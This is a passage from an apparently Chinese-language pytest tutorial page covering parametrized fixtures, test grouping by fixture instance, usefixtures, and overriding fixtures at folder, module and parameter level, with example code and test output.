test_appsetup.py</span><br><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, smtp_connection</span>):<br>        self.smtp_connection = smtp_connection<br><br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;module&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">app</span>(<span class="hljs-params">smtp_connection</span>):<br>    <span class="hljs-keyword">return</span> App(smtp_connection) <span class="hljs-comment"># 这个smtp_connection就是之前定义的fixture 在这个被使用了</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_smtp_connection_exists</span>(<span class="hljs-params">app</span>):<br>    <span class="hljs-keyword">assert</span> app.smtp_connection<br></code></pre></td></tr></table></figure><p>由于smtp_connection的参数化，测试将使用两个不同的App实例和各自的smtp服务器运行两次。应用程序fixture不需要知道smtp_connection参数化，因为pytest将完全分析fixture依赖关系图。</p><p>注意，app fixture的作用域是module，并使用了一个模块作用域的smtp_connection fixture。如果smtp_connection缓存在会话作用域中，这个例子仍然可以工作:fixture可以使用“更广”作用域的fixture，但反之则不行:会话作用域的fixture不能以有意义的方式使用模块作用域的fixture。</p><h2 id="4-13-按fixture实例自动对测试进行分组"><a href="#4-13-按fixture实例自动对测试进行分组" class="headerlink" title="4.13 按fixture实例自动对测试进行分组"></a>4.13 按fixture实例自动对测试进行分组</h2><p>Pytest在测试运行期间最小化活动fixture的数量。如果您有一个参数化的fixture，那么使用它的所有测试将首先使用一个实例执行，然后在创建下一个fixture实例之前调用finalizers。除此之外，这简化了创建和使用全局状态的应用程序的测试。</p><p>下面的例子使用了两个参数化的fixture，其中一个是基于每个模块的，所有的函数都执行print调用来显示setup&#x2F;teardown流程:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_module.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;module&quot;</span>, params=[<span class="hljs-string">&quot;mod1&quot;</span>, <span class="hljs-string">&quot;mod2&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">modarg</span>(<span class="hljs-params">request</span>):<br>    param = request.param<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  SETUP modarg&quot;</span>, param)<br>    <span class="hljs-keyword">yield</span> param<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  TEARDOWN modarg&quot;</span>, param)<br><br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;function&quot;</span>, params=[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">otherarg</span>(<span class="hljs-params">request</span>):<br>    param = request.param<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  SETUP otherarg&quot;</span>, param)<br>    <span class="hljs-keyword">yield</span> param<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  TEARDOWN otherarg&quot;</span>, param)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_0</span>(<span class="hljs-params">otherarg</span>):  <span class="hljs-comment"># 这个用的是otherarg 是独立的执行了2次</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  RUN test0 with otherarg&quot;</span>, otherarg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_1</span>(<span class="hljs-params">modarg</span>): <span class="hljs-comment"># 这个用了modarg 执行了两次</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  RUN test1 with modarg&quot;</span>, modarg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_2</span>(<span class="hljs-params">otherarg, modarg</span>): <span class="hljs-comment"># 这个是2+2次，</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  RUN test2 with otherarg <span class="hljs-subst">&#123;otherarg&#125;</span> and modarg <span class="hljs-subst">&#123;modarg&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>总共执行了8次,让我们在详细模式下运行测试并查看打印输出：详细模式，就是加了-s的模式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">======================= test session starts ==============================<br>platform linux -- Python <span class="hljs-number">3.10</span><span class="hljs-number">.12</span>, pytest-<span class="hljs-number">8.1</span><span class="hljs-number">.1</span>, pluggy-<span class="hljs-number">1.4</span><span class="hljs-number">.0</span> -- /home/wang/code//venvadmin/<span class="hljs-built_in">bin</span>/python<br>cachedir: .pytest_cache<br>rootdir: /home/wang/<br>configfile: pytest.ini<br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span><br>collecting ... collected <span class="hljs-number">8</span> items<br><br>testcases/test_fixturestest.py::test_0[<span class="hljs-number">1</span>]   SETUP otherarg <span class="hljs-number">1</span><br>  RUN test0 <span class="hljs-keyword">with</span> otherarg <span class="hljs-number">1</span><br>PASSED  TEARDOWN otherarg <span class="hljs-number">1</span><br><br>testcases/test_fixturestest.py::test_0[<span class="hljs-number">2</span>]   SETUP otherarg <span class="hljs-number">2</span><br>  RUN test0 <span class="hljs-keyword">with</span> otherarg <span class="hljs-number">2</span><br>PASSED  TEARDOWN otherarg <span class="hljs-number">2</span><br><br>testcases/test_fixturestest.py::test_1[mod1]   SETUP modarg mod1<br>  RUN test1 <span class="hljs-keyword">with</span> modarg mod1<br>PASSED<br>testcases/test_fixturestest.py::test_2[mod1-<span class="hljs-number">1</span>]   SETUP otherarg <span class="hljs-number">1</span><br>  RUN test2 <span class="hljs-keyword">with</span> otherarg <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> modarg mod1<br>PASSED  TEARDOWN otherarg <span class="hljs-number">1</span><br><br>testcases/test_fixturestest.py::test_2[mod1-<span class="hljs-number">2</span>]   SETUP otherarg <span class="hljs-number">2</span><br>  RUN test2 <span class="hljs-keyword">with</span> otherarg <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> modarg mod1<br>PASSED  TEARDOWN otherarg <span class="hljs-number">2</span><br><br>testcases/test_fixturestest.py::test_1[mod2]   TEARDOWN modarg mod1<br>  SETUP modarg mod2<br>  RUN test1 <span class="hljs-keyword">with</span> modarg mod2<br>PASSED<br>testcases/test_fixturestest.py::test_2[mod2-<span class="hljs-number">1</span>]   SETUP otherarg <span class="hljs-number">1</span><br>  RUN test2 <span class="hljs-keyword">with</span> otherarg <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> modarg mod2<br>PASSED  TEARDOWN otherarg <span class="hljs-number">1</span><br><br>testcases/test_fixturestest.py::test_2[mod2-<span class="hljs-number">2</span>]   SETUP otherarg <span class="hljs-number">2</span><br>  RUN test2 <span class="hljs-keyword">with</span> otherarg <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> modarg mod2<br>PASSED  TEARDOWN otherarg <span class="hljs-number">2</span><br>  TEARDOWN modarg mod2<br><br><br>============================== <span class="hljs-number">8</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s =============<br></code></pre></td></tr></table></figure><p>您可以看到，参数化的模块范围的建模资源导致了测试执行的排序，从而导致了最少可能的“活动”资源。mod1参数化资源的终结器在mod2资源被设置之前被执行。</p><p>特别要注意的是，test_0是完全独立的，并且首先完成。然后用mod1执行test_1，然后用mod1执行test_2，然后用mod2执行test_1，最后用mod2执行test_2。</p><p>其他参数化资源(具有功能范围)在每次使用它的测试之前设置并在测试之后删除。</p><h2 id="4-14-通过-usefixtures-在类和模块中使用fixtures装置"><a href="#4-14-通过-usefixtures-在类和模块中使用fixtures装置" class="headerlink" title="4.14 通过 usefixtures 在类和模块中使用fixtures装置"></a>4.14 通过 usefixtures 在类和模块中使用fixtures装置</h2><p>有时测试函数不直接需要访问fixture对象。</p><p>例如，测试可能需要使用空目录作为当前工作目录，但不关心具体目录。</p><p>下面是如何使用标准的tempfile和pytest fixture来实现它。我们将fixture的创建分离到一个conftest.py文件中:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of conftest.py</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> tempfile<br><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cleandir</span>():<br>    <span class="hljs-keyword">with</span> tempfile.TemporaryDirectory() <span class="hljs-keyword">as</span> newpath:<br>        old_cwd = os.getcwd()<br>        os.chdir(newpath)<br>        <span class="hljs-keyword">yield</span><br>        os.chdir(old_cwd)<br></code></pre></td></tr></table></figure><p>并通过 usefixtures 标记在测试模块中声明其使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_setenv.py</span><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.mark.usefixtures(<span class="hljs-params"><span class="hljs-string">&quot;cleandir&quot;</span></span>) </span><span class="hljs-comment"># 意思就是可以不传入到test函数中，用usefixture装饰器来使用你的fixture装置，另一种写法而已</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TestDirectoryInit</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_cwd_starts_empty</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">assert</span> os.listdir(os.getcwd()) == []<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;myfile&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-string">&quot;hello&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_cwd_again_starts_empty</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">assert</span> os.listdir(os.getcwd()) == []<br></code></pre></td></tr></table></figure><p>由于使用了usefixtures标记，每个测试方法的执行都需要cleandir fixture，就像您为每个测试方法指定了一个“cleandir”函数参数一样。让我们运行它来验证我们的夹具是否被激活并且测试通过了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest -q<br>..                                                                   [<span class="hljs-number">100</span>%]<br><span class="hljs-number">2</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s<br></code></pre></td></tr></table></figure><p>您可以像这样指定多个装置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@pytest.mark.usefixtures(<span class="hljs-params"><span class="hljs-string">&quot;cleandir&quot;</span>, <span class="hljs-string">&quot;anotherfixture&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(): ...<br></code></pre></td></tr></table></figure><p>您可以使用 <code>pytestmark </code>在测试模块级别指定夹具的使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pytestmark = pytest.mark.usefixtures(<span class="hljs-string">&quot;cleandir&quot;</span>)<br></code></pre></td></tr></table></figure><p>还可以将项目中所有测试所需的装置放入 ini 文件中：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># content of pytest.ini</span><br><span class="hljs-section">[pytest]</span><br><span class="hljs-attr">usefixtures</span> = cleandir<br></code></pre></td></tr></table></figure><p>Warning</p><p>请注意，该标记对夹具功能没有影响。例如，<strong>这不会按预期工作</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@pytest.mark.usefixtures(<span class="hljs-params"><span class="hljs-string">&quot;my_other_fixture&quot;</span></span>)</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_fixture_that_sadly_wont_use_my_other_fixture</span>(): ...<br></code></pre></td></tr></table></figure><p>This generates a deprecation warning, and will become an error in Pytest 8.</p><h2 id="4-15-覆盖各个级别的同名fixtures装置"><a href="#4-15-覆盖各个级别的同名fixtures装置" class="headerlink" title="4.15 覆盖各个级别的同名fixtures装置"></a>4.15 覆盖各个级别的同名fixtures装置</h2><p>在相对较大的测试套件中，您很可能需要使用本地定义的fixture覆盖全局fixture或根fixture，以保持测试代码的可读性和可维护性。</p><h3 id="4-15-1-覆盖conftest-py文件内定义的文件夹（包）级别的固定装置"><a href="#4-15-1-覆盖conftest-py文件内定义的文件夹（包）级别的固定装置" class="headerlink" title="4.15.1 覆盖conftest.py文件内定义的文件夹（包）级别的固定装置"></a>4.15.1 覆盖conftest.py文件内定义的文件夹（包）级别的固定装置</h3><p>结构如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">tests/<br>    __init__.py<br><br>    conftest.py<br>        <span class="hljs-comment"># content of tests/conftest.py</span><br>        <span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-meta">        @pytest.fixture</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">username</span>(): <span class="hljs-comment"># 这个username 的作用域，可以作用在tests整个目录下</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;username&#x27;</span><br><br>    test_something.py<br>        <span class="hljs-comment"># content of tests/test_something.py</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_username</span>(<span class="hljs-params">username</span>):<br>            <span class="hljs-keyword">assert</span> username == <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-comment"># 测试通过</span><br><br>    subfolder/<br>        __init__.py<br><br>        conftest.py<br>            <span class="hljs-comment"># content of tests/subfolder/conftest.py</span><br>            <span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-meta">            @pytest.fixture</span><br>            <span class="hljs-keyword">def</span> <span class="hljs-title function_">username</span>(<span class="hljs-params">username</span>): <span class="hljs-comment"># 在test的下级目录subfolder内又重新定义了一个conftest.py文件，在文件内，又重新定义了username的fixture，属于重写了，在test/subfolder目录内的测试用例，都会使用心得username</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;overridden-&#x27;</span> + username<br><br>        test_something.py<br>            <span class="hljs-comment"># content of tests/subfolder/test_something.py</span><br>            <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_username</span>(<span class="hljs-params">username</span>):<br>                <span class="hljs-keyword">assert</span> username == <span class="hljs-string">&#x27;overridden-username&#x27;</span> <span class="hljs-comment"># 因为是重写后的，所以测试通过</span><br></code></pre></td></tr></table></figure><h3 id="4-15-2-覆盖conftest-py文件内定义的模块（-py）级别的固定装置"><a href="#4-15-2-覆盖conftest-py文件内定义的模块（-py）级别的固定装置" class="headerlink" title="4.15.2 覆盖conftest.py文件内定义的模块（.py）级别的固定装置"></a>4.15.2 覆盖conftest.py文件内定义的模块（.py）级别的固定装置</h3><p>结构如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python">tests/<br>    __init__.py<br><br>    conftest.py<br>        <span class="hljs-comment"># content of tests/conftest.py</span><br>        <span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-meta">        @pytest.fixture</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">username</span>():<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;username&#x27;</span><br><br>    test_something.py<br>        <span class="hljs-comment"># content of tests/test_something.py</span><br>        <span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-meta">        @pytest.fixture</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">username</span>(<span class="hljs-params">username</span>): <span class="hljs-comment"># 测试模块内又单独定义了一个fixture，以当前模块内的为主</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;overridden-&#x27;</span> + username<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_username</span>(<span class="hljs-params">username</span>):<br>            <span class="hljs-keyword">assert</span> username == <span class="hljs-string">&#x27;overridden-username&#x27;</span> <span class="hljs-comment"># 测试通过</span><br><br>    test_something_else.py<br>        <span class="hljs-comment"># content of tests/test_something_else.py</span><br>        <span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-meta">        @pytest.fixture</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">username</span>(<span class="hljs-params">username</span>): <span class="hljs-comment"># 同级目录内又一个模块内又重新定义了一个同名fixute，以这个为准</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;overridden-else-&#x27;</span> + username<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_username</span>(<span class="hljs-params">username</span>):<br>            <span class="hljs-keyword">assert</span> username == <span class="hljs-string">&#x27;overridden-else-username&#x27;</span> <span class="hljs-comment"># 测试通过</span><br></code></pre></td></tr></table></figure><p>在上面的示例中，可以为某些测试模块覆盖具有相同名称的夹具。</p><h3 id="4-15-3-通过参数化夹具覆盖conftest-py内定义的fixture夹具"><a href="#4-15-3-通过参数化夹具覆盖conftest-py内定义的fixture夹具" class="headerlink" title="4.15.3 通过参数化夹具覆盖conftest.py内定义的fixture夹具"></a>4.15.3 通过参数化夹具覆盖conftest.py内定义的fixture夹具</h3><p>目录结构如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">tests/<br>    __init__.py<br><br>    conftest.py<br>        <span class="hljs-comment"># content of tests/conftest.py</span><br>        <span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-meta">        @pytest.fixture</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">username</span>():<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;username&#x27;</span><br><br><span class="hljs-meta">        @pytest.fixture</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">other_username</span>(<span class="hljs-params">username</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;other-&#x27;</span> + username<br><br>    test_something.py<br>        <span class="hljs-comment"># content of tests/test_something.py</span><br>        <span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-meta">        @pytest.mark.parametrize(<span class="hljs-params"><span class="hljs-string">&#x27;username&#x27;</span>, [<span class="hljs-string">&#x27;directly-overridden-username&#x27;</span>]</span>) </span><span class="hljs-comment"># 参数化</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_username</span>(<span class="hljs-params">username</span>):<br>            <span class="hljs-keyword">assert</span> username == <span class="hljs-string">&#x27;directly-overridden-username&#x27;</span><br><br><span class="hljs-meta">        @pytest.mark.parametrize(<span class="hljs-params"><span class="hljs-string">&#x27;username&#x27;</span>, [<span class="hljs-string">&#x27;directly-overridden-username-other&#x27;</span>]</span>)</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_username_other</span>(<span class="hljs-params">other_username</span>):<br>            <span class="hljs-keyword">assert</span> other_username == <span class="hljs-string">&#x27;other-directly-overridden-username-other&#x27;</span><br></code></pre></td></tr></table></figure><p>在上面的示例中，夹具值被测试参数值覆盖。请注意，即使测试不直接使用夹具的值（在函数原型中未提及），也可以通过这种方式覆盖它。</p><h3 id="4-15-4-反之亦然，用非参数化夹具覆盖参数化夹具"><a href="#4-15-4-反之亦然，用非参数化夹具覆盖参数化夹具" class="headerlink" title="4.15.4 反之亦然，用非参数化夹具覆盖参数化夹具"></a>4.15.4 反之亦然，用非参数化夹具覆盖参数化夹具</h3><p>Given the tests file structure is:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">tests/<br>    __init__.py<br><br>    conftest.py<br>        <span class="hljs-comment"># content of tests/conftest.py</span><br>        <span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-meta">        @pytest.fixture(<span class="hljs-params">params=[<span class="hljs-string">&#x27;one&#x27;</span>, <span class="hljs-string">&#x27;two&#x27;</span>, <span class="hljs-string">&#x27;three&#x27;</span>]</span>) </span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">parametrized_username</span>(<span class="hljs-params">request</span>): <span class="hljs-comment"># 参数化夹具</span><br>            <span class="hljs-keyword">return</span> request.param<br><br><span class="hljs-meta">        @pytest.fixture</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">non_parametrized_username</span>(<span class="hljs-params">request</span>): <span class="hljs-comment"># 非参数化夹具</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;username&#x27;</span><br><br>    test_something.py<br>        <span class="hljs-comment"># content of tests/test_something.py</span><br>        <span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-meta">        @pytest.fixture</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">parametrized_username</span>(): <span class="hljs-comment"># 非参数化夹具，覆盖了conftest.py里的参数化夹具</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;overridden-username&#x27;</span><br><br><span class="hljs-meta">        @pytest.fixture(<span class="hljs-params">params=[<span class="hljs-string">&#x27;one&#x27;</span>, <span class="hljs-string">&#x27;two&#x27;</span>, <span class="hljs-string">&#x27;three&#x27;</span>]</span>)</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">non_parametrized_username</span>(<span class="hljs-params">request</span>): <span class="hljs-comment"># 参数化夹具覆盖了conftest.py里的非参数化夹具</span><br>            <span class="hljs-keyword">return</span> request.param<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_username</span>(<span class="hljs-params">parametrized_username</span>):<br>            <span class="hljs-keyword">assert</span> parametrized_username == <span class="hljs-string">&#x27;overridden-username&#x27;</span><br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_parametrized_username</span>(<span class="hljs-params">non_parametrized_username</span>):<br>            <span class="hljs-keyword">assert</span> non_parametrized_username <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;one&#x27;</span>, <span class="hljs-string">&#x27;two&#x27;</span>, <span class="hljs-string">&#x27;three&#x27;</span>]<br><br>    test_something_else.py<br>        <span class="hljs-comment"># content of tests/test_something_else.py</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_username</span>(<span class="hljs-params">parametrized_username</span>):<br>            <span class="hljs-keyword">assert</span> parametrized_username <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;one&#x27;</span>, <span class="hljs-string">&#x27;two&#x27;</span>, <span class="hljs-string">&#x27;three&#x27;</span>]<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_username</span>(<span class="hljs-params">non_parametrized_username</span>):<br>            <span class="hljs-keyword">assert</span> non_parametrized_username == <span class="hljs-string">&#x27;username&#x27;</span><br></code></pre></td></tr></table></figure><p>在上面的例子中，一个参数化的夹具被一个非参数化的版本覆盖，而一个非参数化的夹具被一个特定测试模块的参数化的版本覆盖。这同样适用于测试文件夹级别。</p><h2 id="4-16-使用其他项目的fixture【不建议】"><a href="#4-16-使用其他项目的fixture【不建议】" class="headerlink" title="4.16 使用其他项目的fixture【不建议】"></a>4.16 使用其他项目的fixture【不建议】</h2><p>通常，提供pytest支持的项目将使用入口点，因此只需将这些项目安装到环境中，就可以使用这些fixture。</p><p>如果您想使用不使用入口点的项目中的fixture，您可以在顶部conftest.py文件中定义pytest_plugins，以将该模块注册为插件。</p><p>假设在mylibrary中有一些fixture。你想在app&#x2F;tests目录中重用它们。</p><p>你所需要做的就是在app&#x2F;tests&#x2F;conftest.py中定义pytest_plugins，并指向该模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pytest_plugins = <span 